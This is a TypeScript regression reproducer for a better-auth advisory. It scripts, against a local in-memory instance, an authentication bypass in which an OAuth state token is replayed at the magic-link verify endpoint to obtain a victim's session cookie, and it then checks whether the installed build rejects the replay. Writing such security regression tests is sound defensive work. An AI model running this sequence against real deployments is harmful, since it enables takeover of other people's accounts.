/**
 * GHSA-965c-763c-88jm (CVE-2026-114607) Regression Reproducer — shared core.
 *
 * Vulnerability description:
 * When both `magicLink` plugin and social/generic OAuth providers are enabled,
 * `better-auth` < 1.7.7 stored tokens in the `verification` table without
 * namespace separation. An attacker who supplies a victim's email in OAuth sign-in
 * receives an OAuth `state` parameter that can then be passed to
 * `/api/auth/magic-link/verify?token=<state>` to mint a legitimate session cookie
 * for the victim without having access to the victim's email inbox.
 *
 * Patched behavior (>= 1.7.7):
 * Better Auth enforces namespace prefixes in the `verification` table:
 * `auth-state:<state>` vs `magic-link:<token>`.
 * Passing an OAuth state parameter to `/magic-link/verify` is rejected with
 * INVALID_TOKEN (redirecting with error=INVALID_TOKEN or returning error status),
 * setting ZERO session cookies for the victim.
 *
 * Why this file exists as a shared core:
 * The OLD-RED (vulnerable) and NEW-GREEN (patched) reproduction paths MUST execute
 * the identical code path against whatever `better-auth` build is actually loaded.
 * A separate hand-written script per version can drift and produce a red result
 * for the wrong reason (setup error, missing state, changed API) instead of the
 * security behaviour under test. Both runs therefore call
 * `runGHSA965cReproducer()` and assert on the same result shape.
 *
 * The version reported in `version` is read from the LOADED package manifest, not
 * hardcoded — the caller must confirm it matches the intended build.
 */

import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { createRequire } from 'node:module';

import { betterAuth } from 'better-auth';
import { magicLink } from 'better-auth/plugins';
import { memoryAdapter } from 'better-auth/adapters/memory';

export interface ReproducerResult {
  /** Version of the `better-auth` package that is actually loaded at runtime. */
  version: string;
  isPatched: boolean;
  exploitSucceeded: boolean;
  httpStatus: number;
  cookieHeader: string | null;
  redirectLocation: string | null;
  /** Identifier prefixes stored in `verification` by the loaded build. */
  storedIdentifiers: string[];
  rejectionReason?: string;
}

/**
 * Read the version of the `better-auth` build that Node actually resolves.
 * Fails loudly on read error so a report can never claim a version that was
 * not loaded.
 */
export function getLoadedBetterAuthVersion(): string {
  const require = createRequire(import.meta.url);
  // better-auth's `exports` map does not expose `./package.json`, so resolve the
  // real entry file path and read the manifest of that exact installed build.
  const entryPath = require.resolve('better-auth');
  const packageDir = dirname(dirname(entryPath));
  const manifest = JSON.parse(
    readFileSync(join(packageDir, 'package.json'), 'utf8'),
  ) as { version: string };
  return manifest.version;
}

/**
 * Version boundary of the advisory. The caller asserts the loaded version against
 * this contract so a mismatched install fails loudly instead of silently reporting
 * a stale result.
 */
export const PATCHED_MINIMUM_VERSION = '1.7.7' as const;

export async function runGHSA965cReproducer(): Promise<ReproducerResult> {
  const memoryDb: {
    user: unknown[];
    session: unknown[];
    account: unknown[];
    verification: { identifier: string; value: string }[];
  } = { user: [], session: [], account: [], verification: [] };

  let capturedMagicToken = '';

  const testAuth = betterAuth({
    database: memoryAdapter(memoryDb),
    secret: 'reproducer-fixture-secret-minimum-32-chars-long!!',
    baseURL: 'http://localhost:3000',
    basePath: '/api/auth',
    emailAndPassword: {
      enabled: true,
    },
    socialProviders: {
      github: {
        clientId: 'mock-reproducer-client-id',
        clientSecret: 'mock-reproducer-client-secret',
      },
    },
    plugins: [
      magicLink({
        sendMagicLink: async ({ token }) => {
          capturedMagicToken = token;
        },
      }),
    ],
  });

  const victimEmail = `victim_${Date.now()}@cashclaw.cc`;

  // 1. Create the victim account
  await testAuth.api.signUpEmail({
    body: {
      email: victimEmail,
      password: 'VictimStrongPassword123!',
      name: 'Victim Account',
    },
  });

  // 2. Attacker initiates OAuth sign-in injecting victim's email in additionalData
  const oauthInit = await testAuth.api.signInSocial({
    headers: new Headers(),
    body: {
      provider: 'github',
      callbackURL: 'http://localhost:3000/dashboard',
      additionalData: {
        email: victimEmail,
      },
    },
  });

  const oauthState = new URL(oauthInit.url!).searchParams.get('state')!;

  // 3. Request legitimate Magic Link to populate comparison tokens
  await testAuth.api.signInMagicLink({
    headers: new Headers(),
    body: {
      email: victimEmail,
    },
  });

  if (!capturedMagicToken || !oauthState) {
    throw new Error('[GHSA-965c] Missing oauthState or magicLink token — setup error, not the vulnerability');
  }

  // 4. Attempt exploit: pass OAuth state to /api/auth/magic-link/verify
  const exploitReq = new Request(
    `http://localhost:3000/api/auth/magic-link/verify?token=${encodeURIComponent(oauthState)}`,
    { method: 'GET' },
  );

  const exploitRes = await testAuth.handler(exploitReq);
  const setCookie = exploitRes.headers.get('set-cookie');
  const redirectLocation = exploitRes.headers.get('location');

  const storedIdentifiers = memoryDb.verification.map((v) => v.identifier);

  // An exploit succeeds if a session cookie is issued for the victim
  const exploitSucceeded = Boolean(setCookie && setCookie.includes('better-auth.session_token'));

  // The patch is proven three ways: no cookie, an explicit rejection signal, and
  // namespaced identifiers. A red run must come from the security behaviour, so
  // every distinguishing signal is recorded rather than a single boolean.
  const hasNamespacedIdentifiers =
    storedIdentifiers.some((id) => id.startsWith('auth-state:')) &&
    storedIdentifiers.some((id) => id.startsWith('magic-link:'));

  const isRejected = Boolean(redirectLocation?.includes('error=INVALID_TOKEN')) || exploitRes.status >= 400;

  const isPatched = !exploitSucceeded && isRejected && hasNamespacedIdentifiers;

  return {
    version: getLoadedBetterAuthVersion(),
    isPatched,
    exploitSucceeded,
    httpStatus: exploitRes.status,
    cookieHeader: setCookie,
    redirectLocation,
    storedIdentifiers,
    rejectionReason: redirectLocation ?? undefined,
  };
}
